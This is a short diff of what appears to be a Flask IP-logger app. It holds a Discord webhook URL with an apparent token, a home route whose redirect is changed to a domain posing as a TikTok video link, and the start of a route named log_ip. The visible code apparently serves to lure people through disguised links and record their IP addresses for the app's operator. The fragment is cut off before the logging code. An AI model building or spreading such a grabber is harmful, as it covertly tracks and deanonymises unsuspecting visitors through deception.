@@ -12,7 +12,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0z
 
 @app.route('/')
 def home():
-    return redirect("https://wikipedia-limb.onrender.com/log")
+    return redirect("https://tiktok-watch-id-2aa9dj5ak8a7g1i29hf.onrender.com/log")
 
 @app.route('/log')
 def log_ip():
